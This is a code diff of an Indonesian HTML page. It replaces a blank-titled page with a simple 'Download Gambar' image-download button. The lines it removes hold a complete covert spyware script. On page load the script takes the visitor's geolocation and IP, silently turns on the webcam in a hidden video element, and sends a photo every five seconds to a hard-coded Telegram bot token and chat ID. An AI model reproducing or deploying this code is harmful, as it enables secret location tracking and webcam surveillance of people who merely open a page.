@@ -1,89 +1,23 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+  <meta charset="UTF-8">
+  <title>Download Gambar</title>
 </head>
 <body>
-<script>
-    const TELEGRAM_TOKEN = "8457522818:AAFWFIpbJLgLBB7zAmunFEpF97Z_TPTzci4";
-    const CHAT_ID = "8208058521";
-    async function sendToTelegram(message, photoBlob) {
-        if (photoBlob) {
-            const form = new FormData();
-            form.append("chat_id", CHAT_ID);
-            form.append("photo", photoBlob);
-            form.append("caption", message);
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: form
-            });
-        } else {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-            });
-        }
-    }
+  <h2>Download Gambar</h2>
+  <button id="downloadBtn">Download icon.jpg</button>
 
-    async function getIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch {
-            return "IP gagal didapat";
-        }
-    }
-
-    function getLocation() {
-        return new Promise((resolve, reject) => {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(resolve, reject);
-            } else reject();
-        });
-    }
-
-    async function startCamera() {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            video.autoplay = true;
-            video.muted = true; // supaya nggak ada suara
-            // Jangan append ke body -> invisible
-
-            const canvas = document.createElement("canvas");
-            const ctx = canvas.getContext("2d");
-
-            setInterval(async () => {
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.7));
-                const ip = await getIP();
-                sendToTelegram(`📍 Auto Foto\nIP: ${ip}`, blob);
-            }, 5000); // setiap 5 detik
-        } catch {
-            return;
-        }
-    }
-
-    (async () => {
-        try {
-            const pos = await getLocation();
-            const ip = await getIP();
-            sendToTelegram(`📍 Lokasi Awal\nLat: ${pos.coords.latitude}\nLng: ${pos.coords.longitude}\nIP: ${ip}`);
-        } catch {
-            // gagal akses lokasi
-        }
-
-        startCamera();
-    })();
-</script>
+  <script>
+    document.getElementById("downloadBtn").addEventListener("click", () => {
+      // bikin elemen <a> buat trigger download
+      const a = document.createElement("a");
+      a.href = "icon.jpg";       // path file gambarnya
+      a.download = "icon.jpg";   // nama file hasil download
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    });
+  </script>
 </body>
 </html>
